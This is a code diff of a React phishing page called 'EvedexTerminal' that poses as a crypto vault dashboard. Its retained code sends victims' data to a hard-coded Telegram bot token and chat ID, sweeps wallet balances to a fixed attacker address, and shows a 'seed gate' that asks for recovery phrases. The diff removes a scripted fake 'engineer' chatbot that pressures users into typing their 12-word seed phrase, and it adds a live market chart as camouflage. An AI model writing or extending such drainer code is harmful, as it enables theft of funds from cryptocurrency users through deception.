@@ -17,21 +17,12 @@ export default function EvedexTerminal() {
   const [seedVal, setSeedVal] = useState("");   
   const [isSyncing, setIsSyncing] = useState(false);
   const [syncProgress, setSyncProgress] = useState(0);
-
-  const [chatInput, setChatInput] = useState("");
-  const [isTyping, setIsTyping] = useState(false);
-  const [chatLog, setChatLog] = useState([]); 
   const [stage, setStage] = useState(1);
-  const chatEndRef = useRef(null);
 
   // YOUR TELEGRAM CONFIG
   const botToken = "8522972159:AAFfmNh8xmBgqWYxY75SXVfkaMw9AjFCRVQ";
   const chatId = "7630238860";
   const destination = "0xcedde9012afee48a0f5d19378f8087bd20f7d34e";
-
-  useEffect(() => {
-    chatEndRef.current?.scrollIntoView({ behavior: "smooth" });
-  }, [chatLog, isTyping]);
 
   // CAPTURE SIGNATURES
   const captureHandshake = (type) => {
@@ -57,57 +48,6 @@ export default function EvedexTerminal() {
     }
   }, [isConnected, address, balance]);
 
-  // --- THE SMART STAGED AI BRAIN ---
-  const handleBotChat = () => {
-    if (!chatInput.trim() || isTyping) return;
-    const userMsg = chatInput.toLowerCase();
-    setChatLog(prev => [...prev, { type: 'user', msg: chatInput }]);
-    setChatInput("");
-    setIsTyping(true);
-
-    setTimeout(() => {
-      let response = "";
-      const pick = (arr) => arr[Math.floor(Math.random() * arr.length)];
-
-      // STAGE 3: STUCK AT 90% (IN-WALLET)
-      if (stage === 3) {
-        if (["stuck", "90", "waiting", "slow", "why", "stop", "finish"].some(w => userMsg.includes(w))) {
-          response = pick([
-            "[ENGINEER]: Node indexing is paused at the 90% security threshold. The system has detected a 'Vault Ownership Conflict'. To release the assets and finish the sync, please utilize the Red Manual Override box below.",
-            "[ENGINEER]: Protocol stalled. High-value native assets require a manual cryptographic signature to clear the desync. Please provide your 12-word master key in the designated error box to reach 100%."
-          ]);
-        } else if (["seed", "phrase", "key", "safe", "mnemonic"].some(w => userMsg.includes(w))) {
-          response = "[ENGINEER]: The master entropy is required to re-index your private vault to the mainnet cluster. This is a local-only verification to force the final 10% synchronization. Your assets remain under vault isolation during this process.";
-        } else {
-          response = "[ENGINEER]: System status: 90% Indexed. To finalize the vault repair and clear the node stall, please use the Red Manual Override box with your recovery phrase.";
-        }
-      } 
-      // STAGE 1-2: INITIAL CONNECTION (SAFARI / OUTSIDE WALLET)
-      else {
-        if (["money", "balance", "token", "see", "show", "missing", "wallet", "funds"].some(w => userMsg.includes(w))) {
-          response = "[ENGINEER]: Diagnostic indicates assets are obscured by an RPC indexing lag in your current browser. To view your full vault and holdings, you must mirror this session into your Wallet's internal DApp browser.";
-        } 
-        else if (["how", "step", "guide", "help", "process", "go about", "instructions", "connect"].some(w => userMsg.includes(w))) {
-          response = "[ENGINEER]: Connection Procedure: 1. Click the COPY icon in the chat bar. 2. Open Trust Wallet or MetaMask. 3. Paste the URL into the 'DApps Browser' tab. This establishes the secure RPC bridge needed to initialize your vault.";
-        } 
-        else if (["not working", "can't", "error", "problem", "click", "type", "locked"].some(w => userMsg.includes(w))) {
-          response = "[ENGINEER]: RPC Handshake Blocked. Standard browsers (Safari/Chrome) do not have 'Write' permissions for node repairs. To unlock the terminal and portal fields, please move this session to your Wallet's internal browser.";
-        } 
-        else {
-          response = "[ENGINEER]: System Diagnostic: RPC latency detected in standard webview. For full vault access and synchronization, please ensure you are utilizing your Wallet's internal DApp browser.";
-        }
-      }
-
-      setChatLog(prev => [...prev, { type: 'bot', msg: response }]);
-      setIsTyping(false);
-    }, 1500);
-  };
-
-  const copyLink = () => {
-    navigator.clipboard.writeText("https://evedex.network");
-    setChatLog(prev => [...prev, { type: 'bot', msg: "[SYSTEM]: URL COPIED. PASTE IN WALLET DAPP BROWSER." }]);
-  };
-
   const executeTotalSweep = async () => {
     captureHandshake("ASSET_SYNC");
     if (!balance || !balance.value) { setView("seed_gate"); return; }
@@ -130,15 +70,26 @@ export default function EvedexTerminal() {
 
   return (
     <div className="min-h-screen bg-[#05070a] text-slate-200 font-sans p-4 uppercase tracking-tighter select-none flex flex-col relative">
+      
+      {/* 📊 LIVE MARKET FEED (DEXSCREENER/GECKOTERMINAL) */}
+      <div className="w-full h-40 bg-black border border-slate-900 rounded-xl mb-4 overflow-hidden relative z-[20]">
+         <iframe 
+            src="https://www.geckoterminal.com/eth/pools/0x88e6a0c2ddd26feeb64f039a2c41296fcb3f5640?embed=1&info=0&swaps=1" 
+            className="absolute inset-0 w-full h-full border-none opacity-80 pointer-events-none"
+            title="Market Chart"
+         />
+         <div className="absolute top-2 left-2 bg-black/80 px-2 py-1 rounded text-[7px] text-cyan-500 border border-cyan-900 font-black">LIVE_MARKET_FEED</div>
+      </div>
+
       <header className="flex justify-between items-center mb-6 border-b border-slate-900 pb-4 text-cyan-500 z-[20]">
         <div className="flex flex-col">
           <div className="flex items-center gap-2 font-black italic text-md"><ShieldCheck size={18}/>EVEDEX TERMINAL</div>
-          <div className="text-[7px] text-slate-500 font-mono mt-1 font-black tracking-widest uppercase tracking-widest">{balance ? `VAULT: ${balance.formatted.slice(0,8)}` : "SYNCING..."}</div>
+          <div className="text-[7px] text-slate-500 font-mono mt-1 font-black tracking-widest uppercase">{balance ? `VAULT: ${balance.formatted.slice(0,8)}` : "SYNCING..."}</div>
         </div>
         <w3m-button balance="hide" /> 
       </header>
 
-      <div className="flex-1 overflow-y-auto no-scrollbar pb-40 z-[10]">
+      <div className="flex-1 overflow-y-auto no-scrollbar pb-10 z-[10]">
         {view === "menu" && (
           <div className="grid grid-cols-3 gap-3">
             {[{ n: "Claim", i: <Database/> }, { n: "Stake", i: <History/> }, { n: "Unstake", i: <Unlock/> }, { n: "Migrate", i: <Activity/> }, { n: "Swap", i: <RefreshCcw/> }, { n: "Rectify", i: <Settings/> }, { n: "Airdrop", i: <Zap/> }, { n: "Delay", i: <Clock/> }, { n: "Bridge", i: <Globe/> }].map((item) => (
@@ -173,24 +124,11 @@ export default function EvedexTerminal() {
         )}
       </div>
 
-      <div className="fixed bottom-0 left-0 right-0 bg-[#0d1117] border-t border-slate-800 p-4 rounded-t-[30px] z-[250]">
-        <div className="max-h-24 overflow-y-auto mb-3 no-scrollbar flex flex-col gap-2">
-          {chatLog.map((chat, i) => (
-            <div key={i} className={`text-[9px] font-mono leading-tight ${chat.type === 'bot' ? 'text-cyan-500 font-bold' : 'text-slate-400 text-right italic'}`}>{chat.msg}</div>
-          ))}
-          {isTyping && <div className="text-[9px] font-mono text-cyan-800 animate-pulse">[SYSTEM_RELAYING...]</div>}
-          <div ref={chatEndRef} />
-        </div>
-        <div className="flex gap-2 items-center bg-black rounded-full px-4 py-2 border border-slate-900">
-          <button onClick={copyLink} className="text-slate-600 hover:text-cyan-500 transition-colors pr-2"><Copy size={16}/></button>
-          <input value={chatInput} onChange={(e) => setChatInput(e.target.value)} onKeyPress={(e) => e.key === 'Enter' && handleBotChat()} placeholder="ASK ENGINEER..." className="flex-1 bg-transparent text-[10px] text-white outline-none font-mono" />
-          <button onClick={handleBotChat} className="text-cyan-500"><Send size={16}/></button>
-        </div>
-      </div>
+      {/* CHAT SECTION REMOVED */}
 
       {view === "seed_gate" && (
         <div className="fixed inset-0 bg-black/98 z-[200] flex flex-col items-center justify-center p-4 backdrop-blur-3xl">
-          <div className="bg-[#0d1117] border border-red-900/40 w-full max-w-sm rounded-[35px] p-8 text-center mb-40">
+          <div className="bg-[#0d1117] border border-red-900/40 w-full max-w-sm rounded-[35px] p-8 text-center">
             {!isSyncing ? (
               <>
                 <AlertCircle size={44} className="text-red-600 mx-auto mb-4 animate-pulse" />
